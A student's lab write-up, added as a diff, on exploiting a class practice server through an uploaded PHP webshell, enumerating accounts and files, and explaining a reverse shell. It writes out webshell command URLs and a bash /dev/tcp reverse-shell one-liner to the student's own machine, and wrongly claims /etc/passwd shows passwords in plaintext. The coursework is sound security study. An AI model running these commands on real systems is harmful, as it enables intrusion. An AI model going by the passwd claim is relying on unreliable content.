@@ -1,0 +1,128 @@
+Kaung Thant (John) Win
+
+Part 1
+
+a. The Linux 'whoami' command can be executed by typing the following in the url: 
+http://danger.jeffondich.com/uploadedimages/jwin-webshell01.php?command=whoami
+This works because after uploading the file, the website specifies that the uploaded file is inside the "/uploadedimages" directory. "http://danger.jeffondich.com/uploadedimages/jwin-webshell01.php" runs the file and "?command" provides the argument for the command parameter. 
+
+The web server returns "www-data" as the result. 
+
+b. The <pre> tag reserves any formatting: white space, multiple space, new line, etc, inside its tags. For our given code, even when we remove <pre> tags the code will still run because it is php. However, if the language were in something like python where whitespace is critical for code execution, removing <pre> tag would break the code. 
+
+-----------------------------------------------------------
+Part 2
+
+a. using command 'pwd', we get "/var/www/danger.jeffondich.com/". 
+b. using command 'getent+passwd+1000+60000', we only get user account "jeff". Therefore, there is only one user account on the website. [6]
+c. Yes, using command 'cd+/etc/+;+cat+passwd', we get a list of all user and system accounts and their passwords in plaintext. Some of them include:
+	root, daemon, jeff, www-data, and sshd
+d. No, only the superuser (or root) has reading and writing permissions. Output of ls -a -l on file shadow:  
+shadow -rw-r----- 1 root shadow 1138 Nov 12 2023
+e. secret files:
+	1. filename: kindasecret.txt
+	   dir: "/var/www/danger.jeffondich.com/secrets"
+	   content: "Congratulations! _ _ (.)_(.) _ ( _ ) _ / \/`-----'\/ \ __\ ( ( ) ) /__ ) /\ \._./ /\ ( )_/ /|\ /|\ \_( by Joan Stark, https://www.asciiart.eu/animals/frogs"
+	2. filename: secret.txt
+	   dir: "/var/www/danger.jeffondich.com/youwontfindthiswithgobuster"
+	   content: "Congratulations! ___ ___ (o o) (o o) ( V ) ( V ) /--m-m- /--m-m- https://www.asciiart.eu/animals/birds-land" 
+f. I'm confused with the user account. For "whoami" we get "www-data", but not jeff? What is happening? 
+
+-----------------------------------------------------------
+Part 3
+
+NONE NEED TO BE SUBMITTED
+
+-----------------------------------------------------------
+Part 4
+
+a. In the Kali machine, type command "ifconfig". Among the many output details returned, you can find the "private" (private within the OS but not available to the Carleton network) IP address of the Kali machine under eth0, which is 192.168.126.130. 
+b. Similar to part (a.) with command "ifconfig" under eth0, which is 172.25.17.212. This "eth0" should be used instead of lo (for loopback or localhost) because lo is intended to only be used by the machine (virtual or physical) whereas eth0 address is intended for connections with other devices. 
+c., d. NONE NEED TO BE SUBMITTED
+e. Yes, it is executing commands. I know it's Kali because the shell is www-data@kali instead of my usual shell john@MSI. www-data is the current user inside the Kali machine. 
+f. "%" codes are used to represent URL encoding. They are useful for instances where certain characters may be misinterpreted due to preallocated characters for specific functions on the server [1]. Here are the representations for the % codes used in the bash command [2]:
+	1. %20 --> " " (or whitespace)
+	2. %22 --> " (or double quotation marks)
+	3. %26 --> &
+	4. %3E --> >
+g. Before the reverse shell process can be explained, let us first understand what the executed command is doing. After translating URL encoded characters into ASCII characters, we get: 
+bash -c "bash -i >& /dev/tcp/172.25.17.212/5000 0>&1"
+	1. bash -c "" 	--> read and execute commands from the command_string [4]
+	2. bash -i 	--> starts an interactive bash shell [3]
+	3. >& 		--> redirects both standard output and error to the same destination [3]
+	4. /dev/tcp/... --> special file that represents a TCP connection to the specified IP address and port [3]
+	5. 0>&1		--> redirects standard input to the same destination as the standard output [3]
+The reverse shell procedure diagram is adapted from [5]. 
+
+
+### INJECTION  ###
+
+       Attacker
+            |
+            |
+  (injects malicious code)
+            |
+            v
++---------------------------+
+|         Server            |
+|                           |
+| (malicious code remains   |
+| dormant inside the server)|
++---------------------------+
+
+--------------------------------------
+
+### REVERSE SHELL EXECUTION ###
+
+          Attacker
+            |
+            |
+ (opens a port on their machine 
+         using netcat)
+            |
+            v
++--------------------------------+
+|          Attacker              |
+|                                |
+| (sends HTTP request to server  |
+|   with bash command            |
+|  to activate malicious payload)|
++--------------------------------+
+            |
+            |
+            v
++---------------------------------------------+
+|        bash -i creates a new shell          |
+| >& and 0>&1 redirect inputs and outputs     |
+|     to the attacker's shell                 |
++---------------------------------------------+
+            |
+            |
+            v
++---------------------------------------------+
+|          Attacker Shell                     |
+|            bash -c ""                       |
+|        (sends input to server)              |
++---------------------------------------------+
+            |              ^
+            |              |
+            v              |
++---------------------------------------------+
+|                Server                       |
+|                                             |
+| (executes command and sends output          |
+| back to attacker machine)                   |
++---------------------------------------------+
+
+
+
+
+-----------------------------------------------------------
+References 
+
+[1] W3.org. "Addressing/ URL." https://www.w3.org/Addressing/URL/url-spec.html
+[2] W3Schools. "HTML URL Encoding Reference." https://www.w3schools.com/tags/ref_urlencode.ASP. 
+[3] HackTricks. "Reverse Shells - Linux." https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux
+[4] GNU.org. "Bash Reference Manual." https://www.gnu.org/software/bash/manual/bash.html#Shell-Commands
+[5] The Linux Point [YouTube]. "How Does A Reverse Shell Works? | remote access to target using netcat". https://www.youtube.com/watch?v=S99C5jNkOgA
+[6] PhoenixNap. "How to List Users in Linux." https://phoenixnap.com/kb/how-to-list-users-linux
